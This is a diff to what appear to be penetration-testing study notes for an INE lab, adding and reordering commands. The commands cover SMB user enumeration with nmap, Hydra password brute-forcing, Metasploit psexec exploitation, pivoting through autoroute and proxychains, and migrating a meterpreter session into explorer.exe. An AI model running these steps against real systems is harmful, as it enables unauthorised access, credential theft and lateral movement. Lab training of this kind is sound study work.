@@ -1665,6 +1665,17 @@ run
 
 #### SMB & NetBIOS Enumeration:
 
+```shell
+nmap -p445 --script smb-enum-users.nse  demo.ine.local
+```
+
+> see the user and than make a users.txt file
+
+```Shell
+hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
+```
+> Hydra command to brute force `smb` users pass.
+
 ```msfconsole
 msfconsole -q
 use exploit/windows/smb/psexec
@@ -1676,11 +1687,7 @@ exploit
 
 > This module can be used to exploit the machine using `smb` creds.
 
-```Shell
-hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
-```
 
-> Hydra command to brute force `smb` users pass.
 
 ```cmd
 run autoroute -s 10.0.22.69/20
@@ -1693,6 +1700,12 @@ cat /etc/proxychains4.conf
 ```
 
 > Socks proxy configuration is in this file.
+
+***result***
+```shell
+# defaults set to "tor"
+socks4  127.0.0.1 9050
+```
 
 ```msfconsole
 use auxiliary/server/socks_proxy
@@ -1713,7 +1726,9 @@ proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
 > This is how you can run commands to other machine using `proxychains` from `metasploit`.
 
 ```CMD
-net view 10.0.22.69
+migrate -N explorer.exe (meterpreter)
+shell
+net view 10.0.22.69 
 ```
 
 > This lists down all the shared resources (if any) between two machines on a network.
